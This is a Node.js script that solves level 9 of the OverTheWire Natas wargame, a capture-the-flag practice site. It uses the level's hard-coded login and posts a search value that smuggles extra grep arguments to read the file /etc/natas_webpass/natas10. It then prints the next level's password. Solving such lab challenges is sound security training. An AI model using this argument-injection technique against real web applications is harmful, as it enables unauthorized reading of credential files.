#!/usr/bin/env node
const axios = require("axios");
const cheerio = require("cheerio");

const username = "natas9";
const password = "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl";

const url = `http://${username}.natas.labs.overthewire.org`;

const data = {
  needle: ". /etc/natas_webpass/natas10 --exclude-from",
  submit: "Search",
};

const urlEncodedData = Object.keys(data)
  .map((key) => `${key}=${data[key]}`)
  .join("&");

(async () => {
  const response = await axios.post(url, urlEncodedData, {
    auth: {
      username,
      password,
    },
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
  });

  const $ = cheerio.load(response.data);
  const re = />(.\w+)\n/;

  console.log($.html().match(re)[1]);
})();
